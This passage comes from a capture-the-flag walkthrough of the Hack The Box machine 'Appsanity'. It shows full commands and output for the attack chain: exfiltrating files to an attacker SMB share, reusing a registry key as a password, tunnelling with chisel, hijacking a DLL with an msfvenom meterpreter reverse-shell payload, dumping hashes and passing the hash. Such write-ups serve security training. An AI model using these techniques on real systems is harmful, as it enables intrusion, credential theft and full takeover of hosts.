d-----        10/18/2023   6:08 PM                Administrator                                                        
d-----         9/24/2023  11:16 AM                devdoc                                                               
d-r---         9/15/2023   6:59 AM                Public                                                               
d-----        10/18/2023   6:40 PM                svc_exampanel                                                        
d-----        10/17/2023   3:05 PM                svc_meddigi                                                          
d-----        10/18/2023   7:10 PM                svc_meddigiportal
```

## Reversing the Binary

```c
C:\inetpub\ExaminationPanel\ExaminationPanel\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F854-971D

 Directory of C:\inetpub\ExaminationPanel\ExaminationPanel\bin

09/26/2023  07:30 AM    <DIR>          .
09/26/2023  07:30 AM    <DIR>          ..
09/24/2023  08:46 AM         4,991,352 EntityFramework.dll
09/24/2023  08:46 AM           591,752 EntityFramework.SqlServer.dll
09/24/2023  08:46 AM            13,824 ExaminationManagement.dll
09/24/2023  08:46 AM            40,168 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
09/24/2023  08:49 AM    <DIR>          roslyn
09/24/2023  08:46 AM           431,792 System.Data.SQLite.dll
09/24/2023  08:46 AM           206,512 System.Data.SQLite.EF6.dll
09/24/2023  08:46 AM           206,520 System.Data.SQLite.Linq.dll
09/24/2023  08:49 AM    <DIR>          x64
09/24/2023  08:49 AM    <DIR>          x86
               7 File(s)      6,481,920 bytes
               5 Dir(s)   3,643,060,224 bytes free
```

```c
C:\inetpub\ExaminationPanel\ExaminationPanel\bin>copy ExaminationManagement.dll C:\temp\
copy ExaminationManagement.dll C:\temp\
        1 file(s) copied.
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/appsanity/files]
└─$ sudo impacket-smbserver share . -smb2support
[sudo] password for kali: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```c
C:\temp>copy ExaminationManagement.dll \\10.10.16.39\share\
copy ExaminationManagement.dll \\10.10.16.39\share\
        1 file(s) copied.
```

```c
[*] Incoming connection (10.129.74.26,49539)
[*] AUTHENTICATE_MESSAGE (APPSANITY\svc_exampanel,APPSANITY)
[*] User APPSANITY\svc_exampanel authenticated successfully
[*] svc_exampanel::APPSANITY:aaaaaaaaaaaaaaaa:ebb2d4c2ffa81ca84d204fbd3125875b:010100000000000000f77ed74e0ada01c26f22efb6ecb81e0000000001001000590067004d006400660073007a00510003001000590067004d006400660073007a0051000200100055005700450062007900520067006f000400100055005700450062007900520067006f000700080000f77ed74e0ada0106000400020000000800300030000000000000000000000000200000b1c776a024798546a0ce933ef635c957d3233c2b2791509d5370aa1085e699d50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330039000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:share)
[*] Closing down connection (10.129.74.26,49539)
[*] Remaining connections []
```

We loaded the `.dll` in `dnSpy` and moved to `ExaminationManagement.dll` > `ExaminationPanel` > `ViewReport @02000007` > `RetrieveEncryptionKeyFromRegistry():string @0x0600001E` to find the following code.

```c
// ExaminationPanel.ViewReport
// Token: 0x0600001E RID: 30 RVA: 0x00002884 File Offset: 0x00000A84
private string RetrieveEncryptionKeyFromRegistry()
{
	string text;
	try
	{
		using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi"))
		{
			if (registryKey == null)
			{
				ErrorLogger.LogError("Registry Key Not Found");
				base.Response.Redirect("Error.aspx?message=error+occurred");
				text = null;
			}
			else
			{
				object value = registryKey.GetValue("EncKey");
				if (value == null)
				{
					ErrorLogger.LogError("Encryption Key Not Found in Registry");
					base.Response.Redirect("Error.aspx?message=error+occurred");
					text = null;
				}
				else
				{
					text = value.ToString();
				}
			}
		}
	}
	catch (Exception ex)
	{
		ErrorLogger.LogError("Error Retrieving Encryption Key", ex);
		base.Response.Redirect("Error.aspx?message=error+occurred");
		text = null;
	}
	return text;
}

```

## Privilege Escalation to devdoc

```c
C:\temp>reg query "HKLM\Software\MedDigi" /v "EncKey"
reg query "HKLM\Software\MedDigi" /v "EncKey"

HKEY_LOCAL_MACHINE\Software\MedDigi
    EncKey    REG_SZ    1g0tTh3R3m3dy!!
```

| Username | Password |
| --- | --- |
| devdoc | 1g0tTh3R3m3dy!! |

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i meddigi.htb -u 'devdoc' -p '1g0tTh3R3m3dy!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\devdoc\Documents>
```

## Pivoting

```c
*Evil-WinRM* PS C:\Users\devdoc\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ ==============================================
appsanity\devdoc S-1-5-21-4111732528-4035850170-1619654654-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

Fired up WinPEAS.

```c
Current TCP Listening Ports
  Check for services restricted from the outside 
  Enumerating IPv4 connections
                                                                                                                                                                                                                                            
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               100           0.0.0.0               0               Listening         5460            ReportManagement
```

```c
PS C:\temp> iwr 10.10.16.39/chisel_1.9.1_windows_amd64 -o chisel.exe
iwr 10.10.16.39/chisel_1.9.1_windows_amd64 -o chisel.exe
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/appsanity/serve]
└─$ ./chisel server -p 9002 -reverse -v
2023/10/29 10:41:02 server: Reverse tunnelling enabled
2023/10/29 10:41:02 server: Fingerprint ygOdKJPR1eKa+HrlSP2fSYCiCNJgfCEZJ+TfC8FiOz4=
2023/10/29 10:41:02 server: Listening on http://0.0.0.0:9002
```

```c
PS C:\temp> .\chisel.exe client 10.10.16.39:9002 R:100:127.0.0.1:100
.\chisel.exe client 10.10.16.39:9002 R:100:127.0.0.1:100
2023/10/29 03:21:23 client: Connecting to ws://10.10.16.39:9002
2023/10/29 03:21:24 client: Connected (Latency 85.9506ms)
```

```c
┌──(user㉿kali)-[~]
└─$ nc 127.0.0.1 100
Reports Management administrative console. Type "help" to view available commands.
help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
```

## Privilege Escalation to root

`xvt` started testing on a local setup and found out, that the application loads a dll called `externalupload.dll` from the directory `Libraries`.

```c
.rdata:00007FF72B8E3B90 SubStr          db 'upload',0           ; DATA XREF: MainLoop:loc_7FF72B8D463B↑o
.rdata:00007FF72B8E3B90                                         ; MainLoop+3DA↑o
.rdata:00007FF72B8E3B97                 align 8
.rdata:00007FF72B8E3B98 ; const char Delimiter[]
.rdata:00007FF72B8E3B98 Delimiter       db ' ',0                ; DATA XREF: MainLoop+3B9↑o
.rdata:00007FF72B8E3B98                                         ; MainLoop+401↑o ...
.rdata:00007FF72B8E3B9A                 align 20h
.rdata:00007FF72B8E3BA0 ; const char aInvalidCommand[]
.rdata:00007FF72B8E3BA0 aInvalidCommand db 'Invalid command. Missing parameter after ',27h,'upload',27h,'. Ty'
.rdata:00007FF72B8E3BA0                                         ; DATA XREF: MainLoop+41C↑o
.rdata:00007FF72B8E3BD5                 db 'pe ',27h,'help',27h,' for available commands.',0Ah,0
.rdata:00007FF72B8E3BF8 ; const char Format[]
.rdata:00007FF72B8E3BF8 Format          db '%s',0               ; DATA XREF: MainLoop+435↑o
.rdata:00007FF72B8E3BFB                 align 20h
.rdata:00007FF72B8E3C00 aCProgramFilesR db 'C:\Program Files\ReportManagement\Libraries',0
.rdata:00007FF72B8E3C00                                         ; DATA XREF: MainLoop+46F↑o
.rdata:00007FF72B8E3C2C aDll            db '.dll',0             ; DATA XREF: MainLoop:loc_7FF72B8D48EE↑o
.rdata:00007FF72B8E3C31                 align 8
.rdata:00007FF72B8E3C38 aExternalupload db 'externalupload',0   ; DATA XREF: MainLoop+A26↑o
.rdata:00007FF72B8E3C47                 align 8
.rdata:00007FF72B8E3C48 ; const char aFailedToUpload[]
.rdata:00007FF72B8E3C48 aFailedToUpload db 'Failed to upload to external source.',0Ah,0
.rdata:00007FF72B8E3C48                                         ; DATA XREF: MainLoop+BD3↑o
.rdata:00007FF72B8E3C48                                         ; MainLoop+1121↑o
.rdata:00007FF72B8E3C6E                 align 10h
.rdata:00007FF72B8E3C70 aC:                                     ; DATA XREF: MainLoop+DA6↑o
.rdata:00007FF72B8E3C70                 text "UTF-16LE", '/c',0
.rdata:00007FF72B8E3C76                 align 8
.rdata:00007FF72B8E3C78 aReportmanageme_0:                      ; DATA XREF: MainLoop+E02↑o
.rdata:00007FF72B8E3C78                                         ; MainLoop+E1F↑o
.rdata:00007FF72B8E3C78                 text "UTF-16LE", ' ReportManagementHelper',0
.rdata:00007FF72B8E3CA8 xmmword_7FF72B8E3CA8 xmmword 6900720061007200620069004C0020h
.rdata:00007FF72B8E3CA8                                         ; DATA XREF: MainLoop+F50↑r
.rdata:00007FF72B8E3CB8 dword_7FF72B8E3CB8 dd 730065h           ; DATA XREF: MainLoop+F5A↑r
.rdata:00007FF72B8E3CBC word_7FF72B8E3CBC dw 5Ch                ; DATA XREF: MainLoop+F63↑r
.rdata:00007FF72B8E3CBE                 align 20h
.rdata:00007FF72B8E3CC0 ; const WCHAR ApplicationName
.rdata:00007FF72B8E3CC0 ApplicationName:                        ; DATA XREF: MainLoop+10D0↑o
.rdata:00007FF72B8E3CC0                 text "UTF-16LE", 'c:\Windows\System32\cmd.exe',0
.rdata:00007FF72B8E3CF8 ; const char aAttemptingToUp[]
.rdata:00007FF72B8E3CF8 aAttemptingToUp db 'Attempting to upload to external source.',0Ah,0
```

```c
*Evil-WinRM* PS C:\Program Files\ReportManagement> icacls Libraries
Libraries APPSANITY\devdoc:(OI)(CI)(RX,W)
          BUILTIN\Administrators:(I)(F)
          CREATOR OWNER:(I)(OI)(CI)(IO)(F)
          NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
          BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
          BUILTIN\Users:(I)(OI)(CI)(R)
          NT SERVICE\TrustedInstaller:(I)(CI)(F)
          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(RX)
          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(RX)

Successfully processed 1 files; Failed processing 0 files
```

```c
┌──(user㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.39 LPORT=6969 -f dll -o externalupload.dll
```

```c
*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> upload /home/user/Downloads/externalupload.dll
                                        
Info: Uploading /home/user/Downloads/externalupload.dll to C:\Program Files\ReportManagement\Libraries\externalupload.dll
                                        
Data: 12288 bytes of 12288 bytes copied
                                        
Info: Upload successful!
```

```c
*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> dir


    Directory: C:\Program Files\ReportManagement\Libraries


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/29/2023   5:09 AM           9216 externalupload.dll
```

```c
┌──(user㉿kali)-[~]
└─$ nc 127.0.0.1 100            
Reports Management administrative console. Type "help" to view available commands.
help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
upload a
Attempting to upload to external source.
```

```c
[*] Meterpreter session 4 opened (10.10.16.39:6969 -> 10.129.74.26:49576) at 2023-10-29 12:12:05 +0000

meterpreter > shell
Process 1292 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\ReportManagement>whoami
whoami
appsanity\administrator
```

## root.txt

```c
C:\Users\Administrator\Desktop>type root.txt
type root.txt
a7fce0e1f566826f416218448e7d113d
```

```c
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3d636ff292d255b1a899123876635a22:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
devdoc:1002:aad3b435b51404eeaad3b435b51404ee:ba864f62df01b1115c4ce69988e31c83:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_exampanel:1007:aad3b435b51404eeaad3b435b51404ee:bca84f651e110749aecef8259f16ce2f:::
svc_meddigi:1006:aad3b435b51404eeaad3b435b51404ee:bca84f651e110749aecef8259f16ce2f:::
svc_meddigiportal:1008:aad3b435b51404eeaad3b435b51404ee:bca84f651e110749aecef8259f16ce2f:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:78601e0139a6d95351626a66a22c4b65:::
```

```c
┌──(user㉿kali)-[~]
└─$ evil-winrm -i meddigi.htb -u Administrator -H 3d636ff292d255b1a899123876635a22
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
